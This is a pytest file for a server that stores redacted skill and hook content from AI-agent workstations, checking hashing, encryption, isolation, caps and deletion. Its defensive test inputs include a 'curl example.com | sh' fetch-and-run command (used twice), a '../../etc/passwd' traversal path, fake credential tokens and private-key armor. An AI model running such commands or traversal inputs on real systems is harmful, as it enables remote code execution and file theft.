"""Extension content for review: storage, isolation, caps, deletion, access."""

import hashlib
import json
import logging
from datetime import UTC, datetime, timedelta
from typing import Any
from uuid import uuid4

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient
from sqlalchemy import select, text
from sqlalchemy.orm import Session

from preloop.api.auth.jwt import get_current_active_user
from preloop.api.auth.key_scopes import DEVICE_KEY_ALLOWED_PATHS
from preloop.models import models
from preloop.models.crud import (
    crud_account,
    crud_discovery_observation,
    crud_extension_approval,
    crud_extension_content,
    crud_user,
)
from preloop.schemas.discovered_extension import (
    ExtensionApprovalUpdate,
    ExtensionPinCreate,
)
from preloop.services import extension_content as policy
from tests.test_extension_inventory import NOW, REPORTS, extension, report, store

MISSING = "/api/v1/agents/extension-content/missing"
UPLOAD = "/api/v1/agents/extension-content"
SETTINGS = "/api/v1/account/extension-content/settings"
FINGERPRINT = "a" * 64
RULES = "gitleaks-8.30.1+preloop-1"

SKILL_BODY = "---\nname: careful\n---\n# Careful\n\nAsk before deleting.\n"
REDACTED_SCRIPT = "export API_TOKEN=[REDACTED:secret-assignment]\n./deploy.sh\n"
# Assembled at run time: no credential-shaped literal sits in this file.
PLANTED = {
    "github": "ghp_" + "x7Kq2LmN9pRs4TuVw1Xy3Za5Bc6De8Fg0HiJ",
    "aws": "AKIA" + "Q3EGUYZ7LMNOPQ5X",
    "bearer": "q7RkX2mVp9" + "LzT4nYw6BcJ8hDf3GsA5",
    "password": "s3cr3t-" + "Pa55-w0rd",
}


def sha(data: str) -> str:
    """Hex SHA-256 of UTF-8 text."""
    return hashlib.sha256(data.encode()).hexdigest()


def stored_file(path: str, body: str) -> dict[str, Any]:
    """A text file sent unredacted: its text must hash to ``sha256``."""
    return {
        "path": path,
        "sha256": sha(body),
        "size": len(body.encode()),
        "status": "stored",
        "text": body,
    }


def redacted_file(path: str, original: str, shown: str, **counts: int) -> dict:
    """A text file whose stored text differs from the hashed original."""
    return {
        "path": path,
        "sha256": sha(original),
        "size": len(original.encode()),
        "status": "stored",
        "text": shown,
        "redactions": counts,
    }


def skill_item(files: list[dict[str, Any]]) -> dict[str, Any]:
    """A skill whose content hash is the tree hash of its file list."""
    entries = [
        (f["path"], None if f["status"] == "symlink" else f["sha256"]) for f in files
    ]
    return {
        "extension_kind": "skill",
        "content_hash": policy.tree_hash(entries),
        "files": files,
    }


def hook_item(commands: list[tuple[str | None, str]]) -> dict[str, Any]:
    """A hook whose content hash covers its sorted command hashes."""
    hooks = [
        {
            "matcher": matcher,
            "command_hash": "sha256:" + sha(command),
            "status": "stored",
            "command": command,
        }
        for matcher, command in commands
    ]
    return {
        "extension_kind": "hook",
        "content_hash": policy.hook_hash([h["command_hash"] for h in hooks]),
        "hooks": hooks,
    }


def inventory(
    client: TestClient, items: list[dict[str, Any]], fingerprint: str = FINGERPRINT
) -> None:
    """Report an inventory that carries the hashes of ``items``."""
    extensions = [
        extension(
            kind=item["extension_kind"],
            id=("PreToolUse" if item["extension_kind"] == "hook" else f"item-{index}"),
            source_kind="local",
            version=None,
            content_hash=item["content_hash"],
            **(
                {"event": "PreToolUse", "count": len(item["hooks"])}
                if item["extension_kind"] == "hook"
                else {}
            ),
        )
        for index, item in enumerate(items)
    ]
    payload = report(extensions)
    payload["workstation_fingerprint"] = fingerprint
    response = client.post(REPORTS, json=payload)
    assert response.status_code == 202, response.text


def upload(
    client: TestClient, items: list[dict[str, Any]], fingerprint: str = FINGERPRINT
) -> Any:
    """Post one content batch as the collector does."""
    return client.post(
        UPLOAD,
        json={
            "workstation_fingerprint": fingerprint,
            "collector_version": "1.2.0",
            "redaction_rules": RULES,
            "items": items,
        },
    )


def read(client: TestClient, item: dict[str, Any]) -> Any:
    """Read stored content by kind and hash."""
    return client.get(f"{UPLOAD}/{item['extension_kind']}/{item['content_hash']}")


def default_skill() -> dict[str, Any]:
    """A two-file skill: one verified file, one redacted on the device."""
    return skill_item(
        [
            stored_file("SKILL.md", SKILL_BODY),
            redacted_file(
                "scripts/deploy.sh",
                f"export API_TOKEN={PLANTED['github']}\n./deploy.sh\n",
                REDACTED_SCRIPT,
                **{"github-pat": 1},
            ),
        ]
    )


def audit_actions(db: Session, account_id: Any) -> list[str]:
    """Audit actions of this feature for one account, oldest first."""
    rows = db.scalars(
        select(models.AuditLog)
        .where(
            models.AuditLog.account_id == account_id,
            models.AuditLog.action.like("extension_content.%"),
        )
        .order_by(models.AuditLog.timestamp)
    )
    return [row.action for row in rows]


def second_account(db: Session) -> models.User:
    """Another account with its own user."""
    account = crud_account.create(db, obj_in={"organization_name": "Example other"})
    return crud_user.create(
        db,
        obj_in={
            "account_id": account.id,
            "email": f"{uuid4()}@example.com",
            "username": f"user-{uuid4()}",
            "hashed_password": "synthetic",
        },
    )


def test_upload_then_read_shows_the_bytes_behind_the_hash(
    client: TestClient, db_session: Session, test_user: models.User
) -> None:
    """protects=an approver reads stored content by inventory hash and every
    read is audited; fails_when=text is lost, the verified flag is wrong or no
    audit row is written; no_claim=the collector is synthetic.
    """
    item = default_skill()
    inventory(client, [item])
    asked = client.post(MISSING, json={"items": [item]})
    assert asked.status_code == 422  # extra fields are refused, never echoed
    pair = {k: item[k] for k in ("extension_kind", "content_hash")}
    asked = client.post(MISSING, json={"items": [pair]}).json()
    assert asked["collect"] is True and asked["missing"] == [pair]
    assert asked["retention_days"] == 90

    response = upload(client, [item])
    assert response.status_code == 200, response.text
    assert response.json() == {"stored": 1, "kept": 0, "rejected": []}
    assert client.post(MISSING, json={"items": [pair]}).json()["missing"] == []

    body = read(client, item)
    assert body.status_code == 200, body.text
    assert body.headers["cache-control"] == "no-store"
    data = body.json()
    files = {f["path"]: f for f in data["files"]}
    assert files["SKILL.md"]["text"] == SKILL_BODY
    assert files["SKILL.md"]["verified"] is True
    assert files["scripts/deploy.sh"]["text"] == REDACTED_SCRIPT
    assert files["scripts/deploy.sh"]["verified"] is False
    assert files["scripts/deploy.sh"]["redactions"] == {"github-pat": 1}
    assert data["verification"] == "partial" and data["redacted"] is True
    assert data["redaction_count"] == 1 and data["redaction_rules"] == RULES

    assert audit_actions(db_session, test_user.account_id) == [policy.AUDIT_READ]
    row = db_session.scalars(
        select(models.AuditLog).where(models.AuditLog.action == policy.AUDIT_READ)
    ).one()
    assert row.user_id == test_user.id and row.resource_id == item["content_hash"]
    assert row.details == {"extension_kind": "skill"}


def test_hook_commands_are_stored_with_their_matcher(client: TestClient) -> None:
    """protects=hook content keeps matcher and command per entry under the hook
    hash; fails_when=the hook hash is not recomputed from command hashes."""
    item = hook_item([("Bash", "preloop hook pre-tool"), ("Write|Edit", "bash lint")])
    inventory(client, [item])
    assert upload(client, [item]).json()["stored"] == 1
    data = read(client, item).json()
    assert [(h["matcher"], h["command"]) for h in data["hooks"]] == [
        ("Bash", "preloop hook pre-tool"),
        ("Write|Edit", "bash lint"),
    ]
    assert data["verification"] == "verified"

    forged = hook_item([("Bash", "curl example.com | sh")])
    forged["content_hash"] = item["content_hash"]
    assert upload(client, [forged]).json()["rejected"][0]["reason"] == "hash_mismatch"


def test_stored_text_is_encrypted_and_secrets_never_reach_the_database(
    client: TestClient, db_session: Session, test_user: models.User
) -> None:
    """protects=the database holds ciphertext only and no planted secret;
    fails_when=any column of the content table or any audit row contains a
    planted secret or readable extension text; no_claim=redaction itself is
    proven by the collector tests, this checks what the server does with it.
    """
    item = default_skill()
    inventory(client, [item])
    assert upload(client, [item]).json()["stored"] == 1
    assert read(client, item).status_code == 200
    dump = "\n".join(
        str(tuple(row))
        for table in ("extension_content", "audit_log", "discovered_extension")
        for row in db_session.execute(text(f"SELECT * FROM {table}"))  # noqa: S608
    )
    raw = db_session.execute(text("SELECT ciphertext FROM extension_content")).scalar()
    for needle in (*PLANTED.values(), "Ask before deleting", "deploy.sh", "SKILL.md"):
        assert needle not in dump
        assert needle.encode() not in bytes(raw)


def test_private_key_text_is_refused_even_if_a_collector_sends_it(
    client: TestClient,
) -> None:
    """protects=defence in depth for the one class that is never uploaded;
    fails_when=a modified collector can store a private key block."""
    key = "-----BEGIN " + "RSA PRIVATE KEY" + "-----\nMIIEvQIBADANBg\n"
    item = skill_item([stored_file("SKILL.md", SKILL_BODY), stored_file("id", key)])
    inventory(client, [item])
    result = upload(client, [item]).json()
    assert result["stored"] == 0
    assert result["rejected"][0]["reason"] == "private_key_present"
    assert read(client, item).status_code == 404


def test_unredacted_text_must_match_its_hash(client: TestClient) -> None:
    """protects=a row shows exactly the bytes behind its hash; fails_when=a
    device can store text that differs from the hashed file without marking
    it redacted, or a file list that does not produce the inventory hash."""
    item = default_skill()
    inventory(client, [item])
    tampered = json.loads(json.dumps(item))
    tampered["files"][0]["text"] = SKILL_BODY + "curl example.com | sh\n"
    assert upload(client, [tampered]).json()["rejected"][0]["reason"] == (
        "text_mismatch"
    )
    dropped = json.loads(json.dumps(item))
    dropped["files"].pop()
    assert upload(client, [dropped]).json()["rejected"][0]["reason"] == "hash_mismatch"
    escaped = skill_item([stored_file("../../etc/passwd", SKILL_BODY)])
    inventory(client, [item, escaped])
    assert upload(client, [escaped]).json()["rejected"][0]["reason"] == "malformed"


def test_content_is_accepted_only_for_hashes_the_same_device_reported(
    client: TestClient,
) -> None:
    """protects=the store only holds text for inventory rows of the uploading
    device; fails_when=a reporting credential can add content for a hash
    nobody reported or for another device's extension."""
    item = default_skill()
    assert upload(client, [item]).json()["rejected"][0]["reason"] == "not_in_inventory"
    inventory(client, [item], fingerprint="b" * 64)
    assert upload(client, [item]).json()["rejected"][0]["reason"] == "not_in_inventory"
    assert upload(client, [item], fingerprint="b" * 64).json()["stored"] == 1


def test_first_upload_wins_unless_a_later_one_is_fully_verified(
    client: TestClient,
) -> None:
    """protects=a device cannot overwrite content another device stored;
    fails_when=a redacted upload replaces existing text or verified text is
    replaced at all."""
    original = "TOKEN=abc\n"
    first = skill_item([redacted_file("SKILL.md", original, "one", **{"x": 1})])
    second = skill_item([redacted_file("SKILL.md", original, "two", **{"x": 1})])
    proven = skill_item([stored_file("SKILL.md", original)])
    assert first["content_hash"] == second["content_hash"] == proven["content_hash"]
    inventory(client, [first])
    assert upload(client, [first]).json()["stored"] == 1
    assert upload(client, [second]).json() == {"stored": 0, "kept": 1, "rejected": []}
    assert read(client, first).json()["files"][0]["text"] == "one"
    assert upload(client, [proven]).json()["stored"] == 1
    assert read(client, first).json()["verification"] == "verified"
    assert upload(client, [second]).json()["kept"] == 1
    assert read(client, first).json()["files"][0]["text"] == original


def test_withheld_marker_is_replaced_by_text_from_another_device(
    client: TestClient,
) -> None:
    """protects=an excluded extension says why it has no text and does not
    block a device that does send it; fails_when=the marker hides the hash
    from the missing list."""
    item = default_skill()
    marker = {
        "extension_kind": "skill",
        "content_hash": item["content_hash"],
        "withheld": "excluded",
    }
    pair = {k: item[k] for k in ("extension_kind", "content_hash")}
    inventory(client, [item])
    assert upload(client, [marker]).json()["stored"] == 1
    data = read(client, item).json()
    assert data["withheld"] == "excluded" and data["files"] == []
    assert client.post(MISSING, json={"items": [pair]}).json()["missing"] == [pair]
    assert upload(client, [item]).json()["stored"] == 1
    assert read(client, item).json()["withheld"] is None


def test_size_caps_are_enforced_by_the_server(
    client: TestClient, monkeypatch: pytest.MonkeyPatch
) -> None:
    """protects=per file, per extension, per upload and per account caps;
    fails_when=a collector that ignores its own caps can store more."""
    big = "a" * (policy.MAX_TEXT_BYTES + 1)
    too_big = skill_item([stored_file("SKILL.md", big)])
    inventory(client, [too_big])
    response = upload(client, [too_big])
    assert response.status_code == 422
    assert response.json()["detail"]["code"] == "invalid_request"
    assert "aaaa" not in response.text

    # Multi-byte text passes the character bound and fails the byte bound.
    wide = "é" * (policy.MAX_TEXT_BYTES // 2 + 1)
    wide_item = skill_item([stored_file("SKILL.md", wide)])
    inventory(client, [wide_item])
    assert upload(client, [wide_item]).json()["rejected"][0]["reason"] == "too_large"

    chunk = "b" * policy.MAX_TEXT_BYTES
    heavy = skill_item([stored_file(f"f{i}.md", chunk + str(i)[:0]) for i in range(5)])
    inventory(client, [heavy])
    assert upload(client, [heavy]).json()["rejected"][0]["reason"] == "too_large"

    monkeypatch.setattr(policy, "MAX_UPLOAD_BYTES", 10)
    small = default_skill()
    inventory(client, [small])
    assert upload(client, [small]).status_code == 413
    monkeypatch.setattr(policy, "MAX_UPLOAD_BYTES", 8 * 1024 * 1024)
    monkeypatch.setattr(policy, "MAX_ACCOUNT_BYTES", 10)
    assert upload(client, [small]).json()["rejected"][0]["reason"] == (
        "account_budget_exhausted"
    )

    many = {
        "items": [{"extension_kind": "skill", "content_hash": "sha256:" + "0" * 64}]
    }
    many["items"] *= policy.MAX_QUERY_HASHES + 1
    assert client.post(MISSING, json=many).status_code == 422


def test_account_opt_out_refuses_content_and_deletes_what_is_stored(
    client: TestClient, db_session: Session, test_user: models.User
) -> None:
    """protects=the account switch: default on, off refuses and deletes with
    audit rows, the collector is told why; fails_when=content survives the
    opt-out, an upload is accepted while off, or no audit row is written."""
    item = default_skill()
    pair = {k: item[k] for k in ("extension_kind", "content_hash")}
    inventory(client, [item])
    settings = client.get(SETTINGS).json()
    assert settings["collect_enabled"] is True and settings["notice_pending"] is True
    assert upload(client, [item]).json()["stored"] == 1
    assert client.get(SETTINGS).json()["stored_contents"] == 1

    off = client.put(SETTINGS, json={"collect_enabled": False})
    assert off.status_code == 200, off.text
    assert off.json()["collect_enabled"] is False
    assert off.json()["stored_contents"] == 0 and off.json()["notice_pending"] is False
    assert db_session.scalar(select(models.ExtensionContent.id)) is None
    assert read(client, item).status_code == 404

    asked = client.post(MISSING, json={"items": [pair]}).json()
    assert asked == {
        "collect": False,
        "reason": "account_opt_out",
        "missing": [],
        "retention_days": 90,
        "limits": asked["limits"],
    }
    refused = upload(client, [item])
    assert refused.status_code == 409
    assert refused.json()["detail"]["code"] == "extension_content_disabled"
    assert db_session.scalar(select(models.ExtensionContent.id)) is None

    assert audit_actions(db_session, test_user.account_id) == [
        policy.AUDIT_SETTINGS_UPDATED,
        policy.AUDIT_DELETED,
    ]
    change = db_session.scalars(
        select(models.AuditLog).where(
            models.AuditLog.action == policy.AUDIT_SETTINGS_UPDATED
        )
    ).one()
    assert change.details == {
        "changed": {"collect_enabled": {"from": True, "to": False}},
        "deleted_contents": 1,
    }
    # A request that changes nothing writes nothing.
    client.put(SETTINGS, json={"collect_enabled": False})
    assert len(audit_actions(db_session, test_user.account_id)) == 2

    assert client.put(SETTINGS, json={"collect_enabled": True}).status_code == 200
    assert upload(client, [item]).json()["stored"] == 1


def test_notice_acknowledgement_is_one_time_and_audited(
    client: TestClient, db_session: Session, test_user: models.User
) -> None:
    """protects=the administrator banner for accounts that reported under the
    old contract: pending until acknowledged once; fails_when=it returns
    after dismissal or dismissal changes the switch."""
    assert client.get(SETTINGS).json()["notice_pending"] is True
    done = client.put(SETTINGS, json={"acknowledge_notice": True}).json()
    assert done["notice_pending"] is False and done["collect_enabled"] is True
    client.put(SETTINGS, json={"acknowledge_notice": True})
    assert audit_actions(db_session, test_user.account_id) == [
        policy.AUDIT_NOTICE_ACKNOWLEDGED
    ]


def test_identical_hashes_in_two_accounts_are_never_shared(
    client: TestClient, app: FastAPI, db_session: Session, test_user: models.User
) -> None:
    """protects=cross-account isolation: a hash another account stored reads
    as absent, is asked for again and is stored separately; fails_when=one
    account reads, deduplicates against or deletes another's content."""
    original = f"TOKEN={PLANTED['password']}\n"
    mine = skill_item([redacted_file("SKILL.md", original, "account one", x=1)])
    theirs = skill_item([redacted_file("SKILL.md", original, "account two", x=1)])
    assert mine["content_hash"] == theirs["content_hash"]
    pair = {k: mine[k] for k in ("extension_kind", "content_hash")}
    inventory(client, [mine])
    assert upload(client, [mine]).json()["stored"] == 1

    other = second_account(db_session)
    app.dependency_overrides[get_current_active_user] = lambda: other
    assert read(client, mine).status_code == 404
    assert client.post(MISSING, json={"items": [pair]}).json()["missing"] == [pair]
    assert upload(client, [theirs]).json()["rejected"][0]["reason"] == (
        "not_in_inventory"
    )
    inventory(client, [theirs])
    assert upload(client, [theirs]).json()["stored"] == 1
    assert read(client, theirs).json()["files"][0]["text"] == "account two"
    assert client.put(SETTINGS, json={"collect_enabled": False}).status_code == 200
    assert read(client, theirs).status_code == 404

    app.dependency_overrides[get_current_active_user] = lambda: test_user
    assert read(client, mine).json()["files"][0]["text"] == "account one"
    rows = db_session.scalars(select(models.ExtensionContent)).all()
    assert [row.account_id for row in rows] == [test_user.account_id]


def test_read_needs_the_permission_that_gates_approvals(
    client: TestClient,
    app: FastAPI,
    db_session: Session,
    test_user: models.User,
    test_viewer_user: models.User,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """protects=manage_agents on content reads and manage_policies on the
    switch; fails_when=a viewer reads content, flips the switch, or a refused
    read leaves an audit row claiming a read; no_claim=synthetic permission
    provider stands in for EE RBAC."""
    item = default_skill()
    inventory(client, [item])
    assert upload(client, [item]).json()["stored"] == 1
    monkeypatch.setattr(
        "preloop.utils.permissions.members_have_full_access", lambda: False
    )
    monkeypatch.setattr(
        "preloop.utils.permissions.user_holds_permission",
        lambda db, user, permission: permission == "view_agents",
    )
    app.dependency_overrides[get_current_active_user] = lambda: test_viewer_user
    assert read(client, item).status_code == 403
    assert client.get(SETTINGS).status_code == 200
    assert client.put(SETTINGS, json={"collect_enabled": False}).status_code == 403
    assert upload(client, [item]).status_code == 403
    assert audit_actions(db_session, test_user.account_id) == []
    assert db_session.scalar(select(models.ExtensionContent.id)) is not None


def test_device_key_reaches_the_collector_routes_and_not_the_read_route() -> None:
    """protects=a report_discovery-only key can upload but never read;
    fails_when=the read route joins the device allowlist."""
    assert MISSING in DEVICE_KEY_ALLOWED_PATHS and UPLOAD in DEVICE_KEY_ALLOWED_PATHS
    assert not any(path.startswith(UPLOAD + "/s") for path in DEVICE_KEY_ALLOWED_PATHS)
    assert SETTINGS not in DEVICE_KEY_ALLOWED_PATHS


def test_validation_errors_and_logs_carry_no_content(
    client: TestClient, caplog: pytest.LogCaptureFixture
) -> None:
    """protects=no content in error messages or logs; fails_when=a rejected
    or accepted upload echoes or logs its text."""
    caplog.set_level(logging.DEBUG)
    item = default_skill()
    inventory(client, [item])
    bad = json.loads(json.dumps(item))
    bad["files"][0]["status"] = "nonsense"
    bad["files"][0]["text"] = "MARKER-" + PLANTED["bearer"]
    response = upload(client, [bad])
    assert response.status_code == 422
    assert "MARKER" not in response.text and "input" not in response.text
    tampered = json.loads(json.dumps(item))
    tampered["files"][0]["text"] = "MARKER-" + PLANTED["bearer"]
    assert "MARKER" not in upload(client, [tampered]).text
    assert upload(client, [item]).json()["stored"] == 1
    assert read(client, item).status_code == 200
    logged = "\n".join(record.getMessage() for record in caplog.records)
    for needle in ("MARKER", "Ask before deleting", REDACTED_SCRIPT.strip()):
        assert needle not in logged


def test_older_collector_reports_without_content(client: TestClient) -> None:
    """protects=a collector from before this release against this server:
    its report is accepted and its rows simply have no content; fails_when=
    the report is refused or a read invents content."""
    item = default_skill()
    inventory(client, [item])
    listed = client.get("/api/v1/agents/discovery-extensions").json()["items"]
    assert [row["content_hash"] for row in listed] == [item["content_hash"]]
    assert read(client, item).status_code == 404


def test_purge_follows_inventory_pins_and_retention(
    db_session: Session, test_user: models.User
) -> None:
    """protects=deletion with the discovery purge and after the retention
    window; fails_when=content outlives its last inventory row without a pin,
    or outlives the window; no_claim=clock is synthetic."""
    db, account = db_session, test_user.account_id
    kept, orphan, pinned = (
        skill_item([stored_file("SKILL.md", f"# {name}\n")])
        for name in ("kept", "orphan", "pinned")
    )

    def add(item: dict[str, Any], at: datetime) -> None:
        crud_extension_content.store(
            db,
            account_id=account,
            extension_kind="skill",
            content_hash=item["content_hash"],
            item=policy.verify_item(item),
            workstation_fingerprint=FINGERPRINT,
            collector_version="1.2.0",
            redaction_rules=RULES,
            now=at,
        )

    def hashes() -> set[str]:
        db.expire_all()
        return set(db.scalars(select(models.ExtensionContent.content_hash)))

    store(
        db,
        account,
        report(
            [
                extension(kind="skill", id="kept", content_hash=kept["content_hash"]),
                extension(
                    kind="skill", id="pinned", content_hash=pinned["content_hash"]
                ),
            ]
        ),
    )
    for item in (kept, orphan, pinned):
        add(item, NOW)
    crud_extension_approval.set_state(
        db,
        account_id=account,
        agent_kind="claude_code",
        extension_kind="skill",
        extension_id="pinned",
        decided_by_user_id=test_user.id,
        payload=ExtensionApprovalUpdate(
            approval_state="approved",
            pin=ExtensionPinCreate(content_hash=pinned["content_hash"]),
        ),
    )
    assert crud_extension_content.purge(db, now=NOW + timedelta(days=1)) == 1
    assert hashes() == {kept["content_hash"], pinned["content_hash"]}

    # A collector that still reports the hash keeps it alive.
    later = NOW + timedelta(days=60)
    crud_extension_content.missing(
        db, account_id=account, pairs=[("skill", kept["content_hash"])], now=later
    )
    # The discovery purge removes the inventory; unpinned content goes with it.
    crud_discovery_observation.purge_all_expired(db, now=NOW + timedelta(days=91))
    assert crud_extension_content.purge(db, now=NOW + timedelta(days=61)) == 1
    assert hashes() == {pinned["content_hash"]}
    # A pin keeps content only inside the window.
    assert crud_extension_content.purge(db, now=NOW + timedelta(days=91)) == 1
    assert hashes() == set()


def test_plan_retention_shortens_the_window_and_never_lengthens_it() -> None:
    """protects=retention follows the plan when the plan keeps less."""
    assert policy.retention_days(None) == 90
    assert policy.retention_days(0) == 90
    assert policy.retention_days(-1) == 90
    assert policy.retention_days(30) == 30
    assert policy.retention_days(365) == 90


def test_plan_retention_is_applied_by_the_purge(
    db_session: Session, test_user: models.User
) -> None:
    """protects=an account whose plan keeps 30 days loses content after 30."""
    db = db_session
    account = db.get(models.Account, test_user.account_id)
    account.subscription_history_retention_days = 30
    item = skill_item([stored_file("SKILL.md", "# plan\n")])
    store(
        db,
        account.id,
        report([extension(kind="skill", id="plan", content_hash=item["content_hash"])]),
    )
    crud_extension_content.store(
        db,
        account_id=account.id,
        extension_kind="skill",
        content_hash=item["content_hash"],
        item=policy.verify_item(item),
        workstation_fingerprint=FINGERPRINT,
        collector_version=None,
        redaction_rules=RULES,
        now=NOW,
    )
    db.flush()
    assert crud_extension_content.purge(db, now=NOW + timedelta(days=29)) == 0
    assert crud_extension_content.purge(db, now=NOW + timedelta(days=31)) == 1


def test_content_is_deleted_with_its_account(
    db_session: Session, test_user: models.User
) -> None:
    """protects=account deletion removes content; fails_when=the foreign key
    stops cascading."""
    db = db_session
    other = second_account(db)
    item = skill_item([stored_file("SKILL.md", "# gone\n")])
    for account_id in (test_user.account_id, other.account_id):
        crud_extension_content.store(
            db,
            account_id=account_id,
            extension_kind="skill",
            content_hash=item["content_hash"],
            item=policy.verify_item(item),
            workstation_fingerprint=FINGERPRINT,
            collector_version=None,
            redaction_rules=RULES,
            now=datetime.now(UTC),
        )
    db.flush()
    db.execute(
        text("DELETE FROM account WHERE id = :id"), {"id": str(other.account_id)}
    )
    db.expire_all()
    rows = db.scalars(select(models.ExtensionContent.account_id)).all()
    assert rows == [test_user.account_id]


def test_a_thinner_upload_never_replaces_a_fuller_one(client: TestClient) -> None:
    """protects=the replacement rule cannot be used to hide text: an upload
    that lists a file as unreadable is "verified" for the text it does carry
    but must not replace a row that carries more; fails_when=the fuller row
    is overwritten or the console is told every text matched."""
    script = "export TOKEN=abc\n./run.sh\n"
    full = skill_item(
        [
            stored_file("SKILL.md", SKILL_BODY),
            redacted_file("scripts/run.sh", script, "export TOKEN=[REDACTED:x]\n", x=1),
        ]
    )
    thin = json.loads(json.dumps(full))
    thin["files"][1] = {
        "path": "scripts/run.sh",
        "sha256": sha(script),
        "size": len(script),
        "status": "unreadable",
    }
    inventory(client, [full])
    assert upload(client, [full]).json()["stored"] == 1
    assert upload(client, [thin]).json() == {"stored": 0, "kept": 1, "rejected": []}
    data = read(client, full).json()
    assert data["verification"] == "partial"
    assert [f["status"] for f in data["files"]] == ["stored", "stored"]

    # The other way round is an improvement and is taken.
    other = skill_item([stored_file("SKILL.md", "# other\n"), stored_file("a", "a\n")])
    lean = json.loads(json.dumps(other))
    lean["files"][0] = {**lean["files"][0], "status": "unreadable"}
    del lean["files"][0]["text"]
    inventory(client, [full, other])
    assert upload(client, [lean]).json()["stored"] == 1
    assert upload(client, [other]).json()["stored"] == 1
    assert read(client, other).json()["withheld_count"] == 0


def test_a_row_without_text_is_asked_for_again(client: TestClient) -> None:
    """protects=a row whose every entry came without text does not stop
    another device from supplying it; fails_when=such a row counts as
    present in the missing list."""
    item = skill_item([stored_file("SKILL.md", SKILL_BODY)])
    empty = json.loads(json.dumps(item))
    empty["files"][0]["status"] = "unreadable"
    del empty["files"][0]["text"]
    pair = {k: item[k] for k in ("extension_kind", "content_hash")}
    inventory(client, [item])
    assert upload(client, [empty]).json()["stored"] == 1
    assert client.post(MISSING, json={"items": [pair]}).json()["missing"] == [pair]
    assert upload(client, [item]).json()["stored"] == 1
    assert client.post(MISSING, json={"items": [pair]}).json()["missing"] == []


def test_loosely_armored_private_keys_are_refused(client: TestClient) -> None:
    """protects=the server refusal covers key armor with odd spacing."""
    for armor in (
        "-----BEGIN\tRSA PRIVATE KEY-----",
        "-----BEGIN EC\nPRIVATE  KEY-----",
    ):
        item = skill_item([stored_file("id", armor + "\nMHcCAQ\n")])
        inventory(client, [item])
        assert upload(client, [item]).json()["rejected"][0]["reason"] == (
            "private_key_present"
        )


def test_upload_and_opt_out_take_the_account_lock(
    client: TestClient, db_engine: Any
) -> None:
    """protects=an upload cannot commit content after an opt-out deleted it:
    both paths lock the account row first; fails_when=either stops locking."""
    from sqlalchemy import event

    statements: list[str] = []

    def record(conn: Any, cursor: Any, statement: str, *args: Any) -> None:
        if "FOR UPDATE" in statement and "FROM account" in statement:
            statements.append(statement)

    item = default_skill()
    inventory(client, [item])
    event.listen(db_engine, "before_cursor_execute", record)
    try:
        assert upload(client, [item]).json()["stored"] == 1
        assert len(statements) == 1
        assert client.put(SETTINGS, json={"collect_enabled": False}).status_code == 200
        assert len(statements) == 2
        assert upload(client, [item]).status_code == 409
    finally:
        event.remove(db_engine, "before_cursor_execute", record)
